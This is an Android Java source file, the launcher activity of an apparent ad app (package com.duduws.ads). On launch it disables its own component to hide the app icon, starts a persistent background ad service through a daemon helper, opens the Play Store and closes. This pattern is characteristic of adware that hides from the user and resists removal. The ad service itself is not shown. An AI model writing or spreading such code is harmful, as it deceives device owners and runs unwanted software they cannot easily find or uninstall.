package com.duduws.ads.view;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;

import com.duduws.ads.log.MLog;
import com.duduws.ads.service.AdService;
import com.duduws.ads.utils.FuncUtils;

/**
 * @author Pengz
 * @mail pch987.net@163.com
 * @time 16/8/2 15:03
 */
public class MainActivity extends Activity{
    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        int res = packageManager.getComponentEnabledSetting(componentName);
        if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT || res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
            //隐藏应用图标
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } else {
            //显示应用图标
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP);
        }

        boolean isServiceRunning = FuncUtils.isServiceRunning(getApplicationContext(), AdService.class.getName());
        if (!isServiceRunning){
            FuncUtils.startDaemon(getApplicationContext(), "com.duduws.ads.service.AdService");
            MLog.i(TAG, "start service ...");
        }

        final String appPackageName = "com.android.vending";
        try{
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
        }catch (Exception e){
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
        }

        finish();
    }
}
